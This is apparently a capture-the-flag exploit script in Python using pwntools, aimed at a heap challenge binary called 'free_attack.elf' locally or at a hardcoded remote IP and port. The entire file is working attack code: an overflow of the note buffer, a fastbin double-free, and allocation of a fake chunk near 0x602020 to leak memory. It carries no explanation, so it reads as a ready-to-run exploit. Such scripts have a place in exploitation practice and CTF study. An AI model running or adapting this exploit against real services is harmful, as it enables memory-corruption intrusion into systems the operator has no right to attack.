#!/usr/bin/env python
from pwn import *

def add(size,name):
    s.sendlineafter('> ','1')
    s.sendlineafter('Size: ',str(size))
    s.sendafter('Name: ',name)
    s.recvuntil('Name: ')
    ret = s.recvline()[:-1]
    s.recvuntil('Addr: ')
    return ret,int(s.recvline()[:-1],16)

def delete(addr):
    s.sendlineafter('> ','2')
    s.sendlineafter('Addr: ','%x' % addr)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./free_attack.elf')
    else:
        s = remote('153.125.224.83',14848)

    fake_chunk = 0x602020 + 0x56
    s.sendlineafter('note:','A' * 0x5e + '\x70')

    addr1 = add(0x68,'A')[1]
    addr2 = add(0x68,'A')[1]
    delete(addr1)
    delete(addr2)
    delete(addr1)
    add(0x68,p64(fake_chunk))
    add(0x68,'A')
    add(0x68,'A')
    print add(0x68,'A' * 0x1a)[0][0x1a:]
